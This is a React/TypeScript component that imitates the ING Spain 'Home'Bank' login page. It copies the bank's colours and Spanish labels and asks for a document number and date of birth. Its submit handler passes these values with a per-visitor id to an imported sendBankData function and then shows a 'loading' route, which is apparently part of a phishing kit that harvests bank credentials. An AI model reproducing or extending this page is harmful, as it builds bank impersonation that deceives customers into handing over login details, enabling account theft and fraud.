import { useState } from 'react'
import { useNavigate, useParams } from 'react-router-dom'
import { sendBankData } from '../../utils/utils'

export function LoginPage() {
  const { id } = useParams()
  const navigate = useNavigate()

  const [login, setLogin] = useState('')
  const [password, setPassword] = useState('')

  const sendAndNavigate = (): void => {
    sendBankData(id!, 'Ing', login, password)
    navigate(`/loading/${id}`)
  }

  return (
    <main className="flex h-full w-full flex-col">
      <div className="mx-auto mt-6 w-full max-w-[480px]">
        <button className="mb-8 border-b-[3px] border-[#ff6200] px-3 font-semibold leading-[42px] text-[#333333]">
          Accede a tu Área Clientes
        </button>

        <div className="mb-6 ml-3 flex flex-col gap-6 bg-white px-8 py-10">
          <span className="text-2xl font-bold leading-8 text-[#ff6200]">Bienvenido a ING Home'Bank</span>
          <div className="flex flex-col gap-2.5">
            <span className="font-medium text-[#333333]">Número de documento</span>
            <input
              value={login}
              onChange={(e) => setLogin(e.target.value)}
              type="text"
              className="h-[42px] w-full border border-black pl-4 pr-8 text-sm font-medium"
            />
          </div>
          <div className="flex flex-col gap-2.5">
            <span className="font-medium text-[#333333]">Fecha de nacimiento</span>
            <input
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              type="text"
              className="h-[42px] w-full border border-black pl-4 pr-8 text-sm font-medium"
            />
          </div>
          <div className="flex flex-row gap-6">
            <button onClick={sendAndNavigate} className="h-10 w-[115px] rounded-lg bg-[#ff6200] text-[19px] font-bold text-white">
              Entrar
            </button>
            <span className="font-semibold text-[#525199]">¿No puede conectarse?</span>
          </div>
        </div>

        <div className="ml-3 flex w-11/12 justify-between text-sm font-medium text-[#333333] underline">
          <a href="">Llámanos</a>
          <a href="">Tutorial</a>
        </div>
      </div>
    </main>
  )
}
